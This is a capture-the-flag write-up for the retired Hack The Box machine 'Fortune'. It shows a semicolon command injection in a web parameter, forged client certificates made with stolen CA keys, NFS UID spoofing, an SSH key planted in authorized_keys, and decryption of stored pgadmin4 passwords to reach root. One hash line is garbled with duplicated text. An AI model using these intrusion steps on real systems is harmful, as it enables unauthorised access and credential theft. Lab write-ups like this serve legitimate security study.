# Fortune

This is the write-up for the box Fortune that got retired at the 3rd August 2019.
My IP address was 10.10.15.241 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.127    fortune.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/fortune.nmap 10.10.10.127
```

We get following results:
```markdown
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```

## Checking HTTP (Port 80)

This is a page that gets you different fortunes whenever you reload it, so there must be some server-side things that happen.
Send it to Burpsuite and try some characters in the _db_ parameter, to see how the page reacts.
As special characters let it error out, we try some fuzzing with **WFUZZ**.

```markdown
wfuzz --hh 293 -w /usr/share/seclists/Fuzzing/special-chars.txt -d db=startrekFUZZ http://10.10.10.127/select
```

This gets us the following characters: &, +, \, ;
The _ampersand_ and the _plus_ are uninteresting for us and the _backslash_ is for escaping characters.
So the only thing that is interesting is the _semicolon_.

If we put a command after the value in the parameter _db_ like this:

```markdown
db=startrek;id
```

Then the command gets executed. This means we try to get a reverse shell with **Netcat**.
It is installed on the machine but doesn't work. There is probably a firewall in the way because pinging works fine.
We are writing our own script to get a reverse shell, that is in this folder named **cmd-inject.py**

Now we have pseudo reverse shell as the user \_fortune.

### Pseudo reverse shell on box
Interesting files on the box:
- /etc/authpf/authpf.rules
  - This are the rules for BSDs Firewall _Packet Filter_
- /var/appsrv/fortune/fortuned.py
  - Flask App on the website
  
We are looking for the signing keys to check the HTTPS page:
```markdown
find / -name *.pem
```

And we find the following keys:
- /home/bob/ca/intermediate/certs/intermediate.cert.pem
- /home/bob/ca/intermediate/private/intermediate.key.pem

## Checking HTTPS (443)

Checking the certificate:
```markdown
openssl s_client -connect 10.10.10.127:443
```

We get potential users named _charlie_ and _bob_

### Creating our own key

Putting contents of intermediate.cert.pem into _intermediate.cert_.
Putting contents of intermediate.key.pem into _intermediate.key_.

```markdown
openssl genrsa -out kyuuji.key 2048
openssl req -new -key kyuuji.key -out kyuuji.csr
openssl x509 -req -in kyuuji.csr -CA intermediate.cert -CAkey intermediate.key -CAcreateserial -out kyuuji.pem -days 1024 -sha256
```

Formatting it into PKCS12 format for Firefox:
```markdown
openssl pkcs12 -export -out kyuuji.pfx -inkey kyuuji.key -in kyuuji.pem -certfile intermediate.cert
```

Now import the .pfx file into the Firefox certificates and the HTTPS site works.
It says:
> You will need to use the local authpf service to obtain elevated network access. If you do not already have the appropriate SSH key pair, then you will need to generate one and configure your local system appropriately to proceed.

The word _generate_ sends us to the path /generate where we can generate a SSH key and copy it into a new file.

After checking the /etc/passwd with out pseudo-shell we can try all possible users and this one works:

```markdown
ssh -i fortune.ssh nfsuser@10.10.10.127
```

But instead of a shell we get this:
> Hello nfsuser. You are authenticated from host "10.10.15.241"

## Next Scan

We do a new nmap scan to see if new ports are open when our SSH connection stays open.

```markdown
nmap 10.10.10.127
```

We get 2 more open ports now:
- Port 8081 as blackice-icecap
- Port 2049 as nfs

### Checking NFS

```markdown
showmount -e 10.10.10.127
```
This command is included in the _nfs-common_ package.

The out we get is: /home (everyone).
That means we can mount this nfs share.

```markdown
mount -t nfs -o vers=2 10.10.10.127:/home /mnt
```

In our /mnt folder we can see the home folders of charlie, bob and nfsuser, so let's check their files.
The user charlie has the UID of one of my users (user01) on my machine, so if I switch to that user I can access his files.

```markdown
su - user01
cat charlie/user.txt
cat mbox
```

**We now have user.txt.**

The mbox file is a mail file and says the following:
> Thanks for setting-up pgadmin4 for me. Seems to work great so far.
> BTW: I set the dba password to the same as root. I hope you don't mind.

We now know that there is a Postgres database that has the same password as root and bob can read it.

## Privilege Escalation

Creating our own key to escalate privileges to charlie.

```markdown
ssh-keygen -f charlie.ssh
(Copy content of charlie.ssh.pub into /mnt/charlie/.ssh/authorized_keys)
chmod 600 charlie.ssh
```

Logging in with charlies SSH key:
```markdown
ssh -i charlie.ssh charlie@10.10.10.127
```

We escalated our privileges to charlie and have a SSH session open!

### Looking for the Postgres database

We should now read the contents of the postgres database where the password for root is in:

```markdown
cd /var/appsrv/pgadmin4
sqlite3 pgadmin4.db
.dump
```

This will give us the hash of the password but if you want to search more granular:

```markdown
sqlite3 pgadmin4.db ".schema" | grep -i Create
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
```

- Hash of server: utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
- Hash of bob: $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vgExecute crypto.py and we get the decrypted password of bob. If we now su - we are root on the machine.

#### Find out what those hashes are

If we read the file _/var/appsrv/pgadmin4/pgadmin4.ini_ we see that the source code of the application is in the folder _/usr/local/pgadmin4/pgadmin4-3.4/web/_

So lets go there and look for the word _decrypt_:

```markdown
grep -iRl decrypt .
```

The file _./pgadmin/utils/crypto.py_ looks very interesting and is the one that decrypts the hashes.
I copy the contents of the file on my machine and put the following line at the end of it:

```markdown
print decrypt("utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz","$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg")
```

Execute crypto.py and we get the decrypted password of bob.
If we now _su -_ we are root on the machine.
